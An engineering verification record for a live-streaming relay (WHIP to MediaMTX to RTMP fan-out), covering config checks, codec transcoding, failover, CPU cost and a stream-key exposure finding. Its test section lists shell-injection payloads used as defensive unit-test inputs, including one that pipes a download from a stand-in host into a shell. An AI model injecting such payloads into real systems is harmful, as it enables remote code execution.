# LIVETAP CORE relay — verification record

**Team:** Relay / DevOps
**Date:** 2026-09-11
**Subject:** `infra/relay/` — WHIP → MediaMTX → RTMP/RTMPS fan-out (ADR-005, ADR-009, ADR-012)
**Executes:** `docs/research/MEDIA_ENGINE_EVALUATION.md` §9.8

Tags follow the convention in MEDIA_ENGINE_EVALUATION.md §0:
`[VERIFIED-HOST]` executed here and output observed · `[VERIFIED-DOC]` confirmed
against a primary source · `[UNVERIFIED]` could not be established.

---

## 0. Headline results

| # | Test | Result |
|---|---|---|
| T1 | MediaMTX v1.21.0 exists, checksum matches, runs | **PASS** |
| T2 | Secrets injected via `MTX_*` env, none in the YAML | **PASS** |
| T3 | Control API requires auth; leaks stream keys if exposed | **PASS** (finding) |
| T4 | Publishing to a path no session created is refused | **PASS** |
| T5 | WHIP ingest of H.264 + Opus from FFmpeg | **PASS** |
| T6 | WHIP auth via `Authorization: Bearer user:pass` | **PASS** |
| T7 | Native `forward` delivers **Opus** to the destination | **PASS** (this is the problem) |
| T8 | `runOnAvailable` hook delivers **H.264 + AAC** to 2 destinations | **PASS** |
| T9 | 9:16 hook produces 1080x1920 H.264 + AAC | **PASS** |
| T10 | Killing one destination does not disturb the other | **PASS** |
| T14 | A killed destination reconnects on its own mid-broadcast | **PASS** |
| T11 | CPU: pass-through vs audio transcode vs 9:16 re-encode | **PASS** (measured) |
| T12 | session-api unit tests (`node --test`) | **PASS** 33/33 |
| T13 | session-api end-to-end against the live relay | **PASS** |
| D1 | `docker compose up -d` | **UNVERIFIED — blocked** |
| B1 | Browser WHIP publish (Chrome/Edge/Firefox/Safari) | **UNVERIFIED — no browser/camera on host** |
| L1 | Opus dropped by a *legacy* RTMP server | **VERIFIED-DOC (source); UNVERIFIED-HOST** |

---

## 1. The Docker blocker — root cause, not a workaround

`docker compose up -d` could **not** be executed. This is not a configuration
problem and cannot be fixed from inside this machine.

Two real Docker Desktop faults were found and fixed along the way, which is how
the true root cause became visible:

**Fault 1 — backend crash on a stale AF_UNIX socket.** `[VERIFIED-HOST]`

```
[com.docker.backend.exe] backend crashed: starting services: initializing Inference manager:
listening on unix://C:/Users/Administrator/AppData/Local/Docker/run/dockerInference:
remove ...dockerInference: The file cannot be accessed by the system.
```

Two zero-byte socket stubs (`dockerInference`, `dockerEthernetVfkit`, dated
2026-08-02) could not be deleted by `del`, `Remove-Item`, or
`System.IO.File::Delete` — all returned *"The file cannot be accessed by the
system."* Fixed by renaming the parent directory and setting
`EnableDockerAI:false` in `%APPDATA%\Docker\settings-store.json`. The same
fault then recurred on `docker-secrets-engine\engine.sock` and was cleared the
same way. After both fixes the backend no longer crashes.

**Fault 2 (root cause) — no hardware virtualisation.** `[VERIFIED-HOST]`

```
wsl.exe --import-in-place docker-desktop <...>\ext4.vhdx
  WSL2 is unable to start since virtualization is not enabled on this machine.
  Error code: Wsl/Service/RegisterDistro/CreateVm/HCS/HCS_E_HYPERV_NOT_INSTALLED
```

```powershell
Get-WindowsOptionalFeature -Online -FeatureName VirtualMachinePlatform   # Enabled
Get-WindowsOptionalFeature -Online -FeatureName Microsoft-Windows-Subsystem-Linux  # Enabled
bcdedit /enum '{current}' | findstr hypervisorlaunchtype                 # Auto
(Get-WmiObject Win32_ComputerSystem).Manufacturer                        # Vultr / VHP
(Get-WmiObject Win32_Processor).VMMonitorModeExtensions                  # False
(Get-WmiObject Win32_Processor).SecondLevelAddressTranslationExtensions  # False
```

Every Windows feature is already enabled and `hypervisorlaunchtype` is `Auto`.
`VMMonitorModeExtensions=False` means the **Vultr host does not expose nested
virtualisation to this guest**. WSL2 therefore cannot create its utility VM, so
Docker Desktop's Linux engine can never start. Hyper-V is not installable for
the same reason.

**This is a host-provider limitation.** Fixing it requires nested virtualisation
enabled on the Vultr instance (or a different instance type / a Linux build
host). Nothing in `infra/relay/` can work around it.

### What was done instead

MEDIA_ENGINE_EVALUATION.md §9.8 anticipates exactly this and names the
alternative: *"download the `mediamtx_vX.Y.Z_windows_amd64.zip` release asset
and run `mediamtx.exe` — a single binary, no dependencies. Verify the checksum
first."* That path was taken.

Crucially, **the same `infra/relay/mediamtx.yml` was used** — the binary was
started with `MTX_*` env overrides that only remap listen addresses to the host
ports the compose file publishes. So the configuration, auth model, path
lifecycle, hook, fan-out and CPU numbers below are all properties of the
delivered artefact. What remains unverified is narrow and specific: container
packaging (image tag, volume mount, service networking, healthchecks).

---

## 2. T1 — MediaMTX version, provenance, integrity `[VERIFIED-HOST]`

```bash
curl -s https://api.github.com/repos/bluenviron/mediamtx/releases/latest | grep tag_name
#   "tag_name": "v1.21.0"        (published 2026-09-05)

curl -s "https://hub.docker.com/v2/repositories/bluenviron/mediamtx/tags?name=1.21.0"
#   1.21.0    1.21.0-ffmpeg    1.21.0-rpi    1.21.0-ffmpeg-rpi
```

Docker Hub tags carry **no `v` prefix** (`bluenviron/mediamtx:1.21.0-ffmpeg`)
while GitHub tags do (`v1.21.0`). The `-ffmpeg` variant is **required**, and the
upstream Dockerfiles at v1.21.0 show exactly why `[VERIFIED-DOC]`:

```dockerfile
# docker/standard.Dockerfile        # docker/ffmpeg.Dockerfile
FROM scratch                        FROM alpine:3.24
                                    RUN apk add --no-cache ffmpeg
COPY --from=binaries /$TARGETPLATFORM /
ENTRYPOINT [ "/mediamtx" ]          ENTRYPOINT [ "/mediamtx" ]
```

The standard image is `FROM scratch` — no ffmpeg and **no shell at all**, so
`runOnAvailable` could not even be executed in it. Both variants read config
from `/mediamtx.yml`, which is what `docker-compose.yml` mounts.

```powershell
(Get-FileHash mediamtx_v1.21.0_windows_amd64.zip -Algorithm SHA256).Hash
# 8a58a9b8c25ee99a96c23dc0a17f39ace3072c01d2e148329073c64ddf83493d
# matches the published checksums.sha256 -> CHECKSUM_OK
.\mediamtx.exe --version    # v1.21.0
```

The `mediamtx.yml` shipped inside the release is **byte-identical** to GitHub
raw at tag `v1.21.0` — so the config analysis below is against exactly what
the pinned image runs:

```
sha256  e5ccdda7ffd86168b12ca2405b91f7a07be4ead266d29701aaed50b39a6d32bb   (both)
```

### Config-key currency `[VERIFIED-HOST]`

| Key | Status in v1.21.0 |
|---|---|
| `runOnAvailable` / `runOnUnavailable` | present |
| `runOnReady` / `runOnNotReady` | **absent** — `grep -c runOnReady` → `0` |
| `forward:` (array of `{dest}`) | present, with `#streamKey` for RTMP/RTMPS |
| `webrtcLocalUDPAddress` | **this** is the ICE UDP key |
| `webrtcICEUDPMuxAddress` | **does not exist** |

MediaMTX **rejects unknown keys outright** rather than ignoring them, which is
a useful safety net — a stale key name fails loudly at startup:

```
ERR: json: unknown field "rtmps"
ERR: json: unknown field "pathDefaults.writeQueueSize"
```

(Both were mistakes in an early draft of `mediamtx.yml`, caught this way. So a
config using the stale `webrtcICEUDPMuxAddress` would fail to start, not
silently bind the wrong port.)

### Undeclared listeners found and closed `[VERIFIED-HOST]`

Media-over-QUIC is **on by default** and silently bound three extra ports:

```
INF [MoQ] started with listeners on :8892 (TCP/HTTP2), :8892 (UDP/HTTP3), :8893 (UDP/QUIC)
```

`moq: no` was added to `mediamtx.yml`. Final listener set is exactly what is
declared:

```
INF [RTSP]   started with listeners on 127.0.0.1:18554 (TCP/RTSP)
INF [RTMP]   started with listener on :19350 (TCP/RTMP)
INF [HLS]    started with listener on :18888 (TCP/HTTP)
INF [WebRTC] started with listeners on :18889 (TCP/HTTP), :18189 (UDP/ICE)
INF [API]    started with listener on 127.0.0.1:19997 (TCP/HTTP)
```

---

## 3. T2 — secrets come from the environment, never the YAML `[VERIFIED-HOST]`

`mediamtx.yml` ships every password as `""`. The `MTX_*` override mechanism
fills them in, and it can **append** list elements that do not exist in the
file at all (index `1` below was created purely from env):

```bash
MTX_AUTHINTERNALUSERS_0_PASS="env-secret-123" \
MTX_AUTHINTERNALUSERS_1_USER="relayapi" \
MTX_AUTHINTERNALUSERS_1_PASS="api-secret-456" \
MTX_AUTHINTERNALUSERS_1_PERMISSIONS_0_ACTION="api" \
./mediamtx.exe probe.yml
```

```bash
curl -s -o /dev/null -w "%{http_code}" http://127.0.0.1:19997/v3/config/global/get
# 401                                    <- unauthenticated refused
curl -s -u relayapi:api-secret-456 http://127.0.0.1:19997/v3/config/global/get
# 200                                    <- env-injected credential works
```

Returned config shows `"pass": "<redacted>"` for both users — MediaMTX redacts
passwords in API output.

---

## 4. T3 — the Control API is a stream-key oracle `[VERIFIED-HOST]` **(security finding)**

MediaMTX redacts `pass`, but **not** `forward[].dest` or `runOnAvailable`:

```bash
curl -u relayapi:… -X POST -d '{"forward":[{"dest":"rtmps://a.rtmp.youtube.com/live2#SECRETKEY"}]}' \
     http://127.0.0.1:19997/v3/config/paths/add/live/sess-test-1
curl -u relayapi:… http://127.0.0.1:19997/v3/config/paths/get/live/sess-test-1
# forward: [{"dest":"rtmps://a.rtmp.youtube.com/live2#SECRETKEY", …}]
#                                                    ^^^^^^^^^ plaintext
```

The same is true of the hook command string. **Anyone who can reach :9997 can
read every connected user's platform stream keys.** Consequences, applied:

* `docker-compose.yml` does not publish 9997.
* `session-api` reaches it over the private compose network only.
* The `relayapi` credential is separate from the browser-facing publisher
  password, so a leaked browser token cannot reach the API.

### API shape `[VERIFIED-HOST]`

| Operation | Verb + path | Result |
|---|---|---|
| create | `POST /v3/config/paths/add/live/<id>` | 200 |
| read | `GET /v3/config/paths/get/live/<id>` | 200 |
| replace | `POST /v3/config/paths/replace/live/<id>` | 200 |
| delete | `DELETE /v3/config/paths/delete/live/<id>` | 200 |
| delete (wrong verb) | `POST /v3/config/paths/delete/live/<id>` | **404** |

Delete is the HTTP `DELETE` verb on a `.../delete/...` path. A `POST` there
returns 404, which is easy to mistake for "already gone".

---

## 5. T4 — no session means no publishable path `[VERIFIED-HOST]`

`paths:` is empty and there is no catch-all template, so a valid publisher
credential alone cannot push media anywhere:

```bash
ffmpeg -re -f lavfi -i testsrc2=size=320x180:rate=10 -f lavfi -i sine=frequency=1000 \
  -c:v libx264 -profile:v baseline -bf 0 -c:a aac -t 3 \
  -f flv "rtmp://livetap:pub-Sekret-9f2a@127.0.0.1:19350/live/never-created"
# Error opening output …: I/O error
```

```
INF [RTMP] [conn 127.0.0.1:60169] closed: path 'live/never-created' is not configured
```

This is the relay's core authorisation invariant.

---

## 6. T5 / T6 — WHIP ingest and its two non-obvious requirements `[VERIFIED-HOST]`

FFmpeg 9.0.1 on this host **does** have the WHIP muxer, so the browser path was
testable without a browser:

```bash
ffmpeg -h muxer=whip
#   Muxer whip [WHIP(WebRTC-HTTP ingestion protocol) muxer]
#   Default video codec: h264.  Default audio codec: opus.
#   -authorization <string>  The optional Bearer token for WHIP Authorization
#   -whip_flags <flags> … dtls_active  Set dtls role as active
```

**Two requirements that cost real debugging time:**

**(a) The Bearer token is `user:pass`, not a bare password.** `[VERIFIED-DOC]`
`internal/protocols/httpp/credentials.go` at v1.21.0:

```go
if strings.HasPrefix(auth, "Bearer ") {
    if parts := strings.Split(auth[len("Bearer "):], ":"); len(parts) == 2 {
        c.User = parts[0]; c.Pass = parts[1]; return c    // user:pass
    }
    c.Token = auth[len("Bearer "):]                        // else treated as a JWT
}
```

A bare password is parsed as a JWT and rejected. `session-api` therefore
returns a ready-made `whipAuthorization: "livetap:<password>"` so the web app
cannot get this wrong.

**(b) Permission paths are whole regexes prefixed with `~`.** The path-template
syntax `live/~^.*$` (valid as a `paths:` key) is **not** valid in a permission,
where it matches a path literally named `live/~^.*$`. The correct form is
`~^live/.*$`. The wrong form fails as a silent 401:

```
INF [WebRTC] [session a7d7d973] closed: failed to authenticate: authentication failed
```

**(c) `-whip_flags dtls_active` is required** for FFmpeg → MediaMTX. MediaMTX is
the DTLS server; without the flag both sides wait passively:

```
INF [WebRTC] [session 0bbe46be] closed: deadline exceeded while waiting connection
```

With all three correct, ingest succeeds:

```
[WHIP muxer] ICE STUN ok, state=7, url=udp://207.148.75.11:18189, elapsed=186.05ms
[WHIP muxer] DTLS handshake is done, elapsed=486.92ms
```
```
INF [path live/…] stream is available and online, 2 tracks (Opus, H264)
INF [WebRTC] [session 33df4519] is publishing to path 'live/…'
```

---

## 7. T7 / T8 — **the Opus question, answered** `[VERIFIED-HOST]` + `[VERIFIED-DOC]`

This determined the whole design.

### Source-level proof: `forward` never transcodes `[VERIFIED-DOC]`

`internal/protocols/rtmp/from_stream.go` at v1.21.0 — the function that turns a
MediaMTX stream into an RTMP stream. `fourCcList` is the Enhanced RTMP
capability list the **destination** advertised:

```go
func FromStream(…, fourCcList amf0.StrictArray) error {
    isEnhanced := len(fourCcList) != 0
    …
    case *format.Opus:
        if slices.Contains(fourCcList, any(fourCCToString(message.FourCCOpus))) {
            …add an Opus track…
        }
        // no else. no transcode branch anywhere in this file.
    …
    if len(tracks) == 0 { return errNoSupportedCodecsFrom }
    …
    // unsupported formats are merely logged:
    r.Parent.Log(logger.Warn, "skipping track %d (%s)", n, …)
}
```

So against a destination that does not advertise Opus, the audio track is
**silently dropped** and video keeps flowing — a stream that looks live and has
no sound. MediaMTX's own docs confirm the intent: *"When the destination
requires transcoding, filtering or a protocol that is not supported by
`forward`, use FFmpeg inside the `runOnAvailable` parameter instead."*

### T7 — empirical: native `forward` delivers Opus `[VERIFIED-HOST]`

Publish H.264 + Opus over WHIP; path configured with native `forward` to two
RTMP receivers:

```bash
curl -u relayapi:… -X POST -d '{"forward":[{"dest":"rtmp://127.0.0.1:19351/live/a"},
                                           {"dest":"rtmp://127.0.0.1:19352/live/b"}]}' \
     http://127.0.0.1:19997/v3/config/paths/replace/live/hook-test
```

```
relay      : INF [path live/hook-test] stream is available and online, 2 tracks (Opus, H264)
receiver A : INF [path live/a] stream is available and online, 2 tracks (H264, Opus)
receiver B : INF [path live/b] stream is available and online, 2 tracks (H264, Opus)
```

**Opus reaches the destination.** These receivers are MediaMTX, which *does*
advertise Enhanced RTMP Opus support. YouTube, Twitch and TikTok do not
(ADR-012: the 2026 ingest matrix has no major platform accepting anything but
H.264 + AAC over RTMP). So native `forward` is wrong for the web path either
way: to an Enhanced-RTMP peer it sends Opus the platform will not decode, and
to a legacy peer it drops the audio entirely.

### T8 — the hook delivers H.264 + AAC `[VERIFIED-HOST]`

Same source, same relay, same two receivers — only the path config differs:

```bash
ffmpeg -nostdin -hide_banner -loglevel warning -fflags +genpts \
  -rtsp_transport tcp -i rtsp://relayhook:PASS@127.0.0.1:$RTSP_PORT/$MTX_PATH \
  -map 0:v:0 -map 0:a:0 \
  -c:v copy -c:a aac -b:a 128k -ar 48000 -ac 2 -max_interleave_delta 0 \
  -f tee "[f=flv:onfail=ignore]rtmp://127.0.0.1:19351/live/a|[f=flv:onfail=ignore]rtmp://127.0.0.1:19352/live/b"
```

```
receiver A : INF [path live/a] stream is available and online, 2 tracks (H264, MPEG-4 Audio)
receiver B : INF [path live/b] stream is available and online, 2 tracks (H264, MPEG-4 Audio)
```

**H.264 passed through untouched, Opus re-encoded to AAC, both destinations
fed by one FFmpeg process.** This is the shipped design.

Notes that became part of the command:

* `-map 0:v:0 -map 0:a:0` is **required**. The RTSP read-back presents audio as
  stream 0:0, and without explicit maps `tee` fails with *"Output file does not
  contain any stream" → Invalid argument*.
* `-fflags +genpts -max_interleave_delta 0` suppresses non-monotonic DTS churn
  from the WebRTC source. Without them, `Non-monotonic DTS … changing to N`
  repeats continuously during video copy. FFmpeg self-corrects either way and
  receivers accepted the stream, but the corrected form is cleaner. Over long
  runs a few warnings still appear — **watch this on real platform ingest.**

### L1 — the legacy-RTMP drop was not reproducible here `[UNVERIFIED-HOST]`

Proving the silent audio drop empirically needs a legacy RTMP server that
advertises no `fourCcList`. None was available without Docker:
`ffmpeg -listen 1` is not usable as a receiver for MediaMTX's RTMP client —
it rejects the connect handshake:

```
relay : ERR [path …] [RTMP dest 1] invalid command payload
rx    : [rtmp] App field don't match up: live/a <-> live
```

(Using the documented `#streamKey` form `rtmp://host/live#a` fixed the app-name
half, but the handshake still failed.) The drop behaviour is therefore
**proven by source inspection, not by execution here.** It should be confirmed
against a real platform during the ADR-012 ingest testing.

---

## 8. T9 — 9:16 re-encode hook `[VERIFIED-HOST]`

16:9 720p in, vertical out:

```bash
… -filter:v crop=ih*9/16:ih,scale=1080:1920 \
  -c:v libx264 -preset veryfast -tune zerolatency -profile:v high \
  -b:v 3000k -maxrate 3000k -bufsize 6000k -g 60 -pix_fmt yuv420p \
  -c:a aac -b:a 128k -ar 48000 -ac 2 -f flv rtmp://…
```

```bash
ffprobe -show_entries stream=codec_type,codec_name,width,height,channels -of csv rtsp://127.0.0.1:19452/live/b
# stream,h264,video,1080,1920
# stream,aac,audio,2
```

Gated behind `LIVETAP_ENABLE_VERTICAL_TRANSCODE=1`. When off, a 9:16
destination is **refused with an explanation** rather than silently sent a 16:9
frame.

---

## 9. T10 — destination isolation `[VERIFIED-HOST]`

With both destinations live, receiver B was killed mid-broadcast:

```powershell
(Get-NetTCPConnection -LocalPort 19352 -State Listen).OwningProcess  # 17832
Stop-Process -Id 17832 -Force
```

Receiver A 15 seconds later — still publishing, uninterrupted:

```
INF [path live/a] stream is available and online, 2 tracks (H264, MPEG-4 Audio)
INF [RTMP] [conn 127.0.0.1:60397] is publishing to path 'live/a'
```

The WHIP publisher also kept running. `onfail=ignore` on each `tee` slave is
what buys this; it satisfies ADR-008's *"one destination failing never
transitions the production or sibling destinations."*

---

### T14 — a dead destination **reconnects on its own** `[VERIFIED-HOST]`

`onfail=ignore` stops one dead destination from killing the process, but on its
own it drops that destination for the **rest of the broadcast**. The fix is the
`use_fifo` mechanism already proven in MEDIA_ENGINE_EVALUATION.md §9.6, now
wired into the hook:

```
-f tee -use_fifo 1 \
-fifo_options "attempt_recovery=1:recovery_wait_time=1:recover_any_error=1:drop_pkts_on_overflow=1:queue_size=120" \
"[f=flv:onfail=ignore]dest1|[f=flv:onfail=ignore]dest2"
```

Receiver B was killed mid-broadcast and restarted 12 s later. Relay log during
the outage — the fifo retrying, and dropping rather than stalling:

```
[rtmp @ …] Cannot open connection tcp://127.0.0.1:19352?tcp_nodelay=0
[fifo @ …] Error opening rtmp://127.0.0.1:19352/live/b: Error number -138 occurred
[fifo @ …] FIFO queue full
```

Receiver B after restart — **recovered with no encoder restart**:

```
23:21:13 INF [path live/b] stream is available and online, 2 tracks (H264, MPEG-4 Audio)
23:21:13 INF [RTMP] [conn 127.0.0.1:61367] is publishing to path 'live/b'
```

Receiver A throughout — same connection id (61344) from before the kill to
after the recovery, never interrupted:

```
23:20:38 INF [RTMP] [conn 127.0.0.1:61344] is publishing to path 'live/a'
```

`drop_pkts_on_overflow=1` is the backpressure guard ADR-005 requires: a stalled
destination drops its own packets and can never stall the ingest or a sibling.

> **Cross-check.** `docs/qa/RELAY_NATIVE_VERIFICATION.md` reaches the same
> conclusion by an independent route (a two-stage design: hook → internal
> AAC path → native `forward`). That variant gets per-destination retry from
> MediaMTX's own forward loop instead of from the fifo. Two independent
> verifications agreeing that **native `forward` alone is wrong for the WHIP
> path and audio must be transcoded to AAC** is the strongest signal in this
> document. The single-stage design here was chosen because it avoids a second
> RTMP serialisation hop; §9.6's fifo closes the reconnect gap that was the
> two-stage design's main advantage.

---

## 10. T11 — CPU cost `[VERIFIED-HOST]`

Host: Vultr VHP, 4 vCPU, **no GPU**. Source 1280x720@30, H.264 + Opus, two RTMP
destinations. 30-second sampling windows of `TotalProcessorTime`; the WHIP
publisher (test harness only) is excluded from the relay figures.

| Mode | Relay + hook | % of 4-core host | Destination receives |
|---|---|---|---|
| Native `forward` ×2 (pass-through) | **~3.2%** of one core | ~0.8% | H.264 + **Opus** |
| Hook: `-c:v copy -c:a aac`, tee ×2 | **~12–15%** of one core | ~3–4% | H.264 + **AAC** |
| Hook: 9:16 full re-encode | **~29.8%** of one core | ~7.5% | H.264 1080x1920 + AAC |

Reading: correctness (Opus→AAC) costs roughly **+10 points of one core** over
raw pass-through — about an eighth of a core per session. Cheap. A 4-core relay
should comfortably carry ~8 concurrent 16:9 sessions on CPU alone; **bandwidth,
not CPU, is the binding constraint** (N× outbound per destination). The 9:16
re-encode is ~2.5× the audio-only cost and is why it is opt-in.

---

## 11. T12 — session-api unit tests `[VERIFIED-HOST]`

```bash
node --test infra/relay/session-api/
# …
# tests 33
# pass 33
# fail 0
# duration_ms 384.1484
```

Coverage includes the `validateIngest` parity cases copied from
`packages/core/src/validation/ingest.test.ts`, explicit shell-injection
payloads (`key;curl evil.sh|sh`, `` key`id` ``, `key$(id)`, …), hook
construction for flat/vertical/mixed destination sets, redaction, and the HTTP
surface against a fake MediaMTX.

---

## 12. T13 — end-to-end through session-api `[VERIFIED-HOST]`

`session-api` run against the live relay, exactly as compose would wire it:

```bash
MTX_PUBLISH_PASSWORD=… MTX_API_PASSWORD=… MTX_HOOK_PASSWORD=… \
MTX_API_URL=http://127.0.0.1:19997 LIVETAP_RELAY_PUBLIC_HOST=127.0.0.1 PORT=18080 \
node infra/relay/session-api/relay-session.mjs
```

```bash
curl http://127.0.0.1:18080/healthz                       # {"ok":true}
curl -X POST … -d '{"destinations":[]}'  # no auth header # 401
```

Create a session with two RTMP destinations:

```bash
curl -X POST http://127.0.0.1:18080/sessions \
  -H "Authorization: Bearer $MTX_PUBLISH_PASSWORD" -H "Content-Type: application/json" \
  -d '{"destinations":[
        {"protocol":"rtmp","url":"rtmp://127.0.0.1:19351/live","streamKey":"a","aspectRatio":"16:9"},
        {"protocol":"rtmp","url":"rtmp://127.0.0.1:19352/live","streamKey":"b","aspectRatio":"16:9"}]}'
# 201
# sessionId: 8914a7e3dd8f41318523eca63439030f
# whipUrl  : http://127.0.0.1:18889/live/8914a7e3dd8f41318523eca63439030f/whip
# whipAuth : livetap:<redacted>
```

The path MediaMTX now holds — note `forward` empty, hook present:

```
name    : live/8914a7e3dd8f41318523eca63439030f
forward : []
hook    : ffmpeg -nostdin -hide_banner -loglevel warning -fflags +genpts -rtsp_transport tcp -i rtsp://…
```

**Log output — stream keys redacted** (this is the whole log, unedited):

```
livetap relay session-api listening on :18080
  MediaMTX API   : http://127.0.0.1:19997
  public WHIP host: 127.0.0.1:18889
  9:16 re-encode : disabled
session 8914a7e3dd8f41318523eca63439030f created with 2 destination(s):
  [{"protocol":"rtmp","url":"rtmp://127.0.0.1:19351/live","streamKey":"••••a","aspectRatio":"16:9"},
   {"protocol":"rtmp","url":"rtmp://127.0.0.1:19352/live","streamKey":"••••b","aspectRatio":"16:9"}]
```

Browser-equivalent WHIP publish to that session, 25 s:

```
receiver A : INF [path live/a] stream is available and online, 2 tracks (H264, MPEG-4 Audio)
receiver B : INF [path live/b] stream is available and online, 2 tracks (H264, MPEG-4 Audio)
```

Teardown:

```bash
curl -X DELETE http://127.0.0.1:18080/sessions/8914a7e3… -H "Authorization: Bearer …"
# delete=204
curl -u relayapi:… http://127.0.0.1:19997/v3/config/paths/get/live/8914a7e3…
# 404   <- path gone
```

Full session lifecycle: **create → publish → fan out to 2 destinations with
correct codecs → delete.**

---

## 13. Teardown

The verification instances were stopped and the scratch directory
(`.relay-verify/`, containing the downloaded binary and test artefacts) was
removed. `docker compose down` was not applicable — no daemon ever started.

Docker Desktop was left **stopped**, with two host-state changes made while
diagnosing and not reverted, because both are fixes rather than damage:

* `%APPDATA%\Docker\settings-store.json`: `EnableDockerAI` / `UseDockerAI` /
  `UseDockerMCPToolkit` set to `false`.
* Stale socket directories renamed to `*.broken-<timestamp>`:
  `%LOCALAPPDATA%\Docker\run`, `%LOCALAPPDATA%\docker-secrets-engine`.

Without these, Docker Desktop's backend crashes on startup. They can be
reverted by deleting the renamed directories and restoring the JSON, but there
is no reason to.

---

## 14. What is still unverified

| Item | Why | How to close it |
|---|---|---|
| **D1** `docker compose up -d`, image `1.21.0-ffmpeg`, volume mount, service DNS, healthchecks | No Docker daemon possible on this host (§1) | Run `docker compose up -d` on any host with a working daemon and repeat §12 |
| **B1** Browser WHIP publish; which browsers negotiate H.264 vs VP8-only | No browser, camera or mic on this headless VM | §9.8 step 8: open `https://<relay>/live/<sessionId>/publish` in Chrome, Edge, Firefox, Safari; record the negotiated video codec. **Still the single most important open item for the web architecture** — if a browser offers only VP8, pass-through is impossible and video must be re-encoded too |
| **L1** Opus silently dropped by a legacy RTMP server | No legacy RTMP server available without Docker; `ffmpeg -listen 1` is incompatible with MediaMTX's RTMP client | Confirm during real-platform ingest testing (ADR-012) |
| RTMPS `#streamKey` against a real platform | No platform credentials on this host | Covered by §9.12 of MEDIA_ENGINE_EVALUATION.md |
| TURN / restrictive-NAT traversal | Single-host loopback testing only | Deploy coturn and test from a mobile network |
| Long-run DTS stability on real ingest | Only ~90 s runs here | Watch for A/V drift on a multi-hour broadcast |
